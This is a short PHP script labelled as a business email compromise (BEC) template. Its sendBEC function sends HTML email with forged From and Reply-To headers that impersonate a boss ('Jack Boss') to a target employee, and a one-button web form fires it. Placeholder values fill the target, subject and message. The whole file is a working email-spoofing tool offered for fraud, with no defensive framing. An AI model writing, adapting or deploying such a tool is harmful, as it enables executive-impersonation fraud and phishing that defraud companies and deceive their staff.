<?php

//bec template 1
//enable debug
error_reporting(E_ALL);
ini_set('display_errors', '1');


function post($name){
    
    if(isset($_POST[$name])){
        return $_POST[$name];
    }
    
    return NULL;
}

function send($to, $subject, $message, $headers=""){

    $mail = (int) mail($to, $subject, $message, $headers);;
    
    return $mail;
}

function sendBEC($to, $subject, $message, $fake_name, $fake_email){

    $headers = '';
    $headers .= "From: $fake_name <$fake_email>" . "\r\n" .
    $headers .= "Reply-To: $fake_name <$fake_email>" . "\r\n";
    $headers .= "X-Power: okane" . "\r\n";
    $headers .= 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";

    $send = send($to, $subject, $message, $headers);
    
    if($send == 1){
        die("[+] Send");
    }
    die("[-] Error sending");

};

$target = "jack@company.co";
$fake_name = "Jack Boss";
$fake_email = "jack.boss@company.co";
$subject = "Title";
$message = "Message";

$mode = post("mode");
if($mode == "send"){
    sendBEC($target, $subject, $message, $fake_name, $fake_email);
    die("SEND");
}


?>
<html>
  <body>
    <form method="post">
        <input type="hidden" name="mode" value="send"/>
        <input type="submit" value="send :)">
    </form>
  </body>
</html>
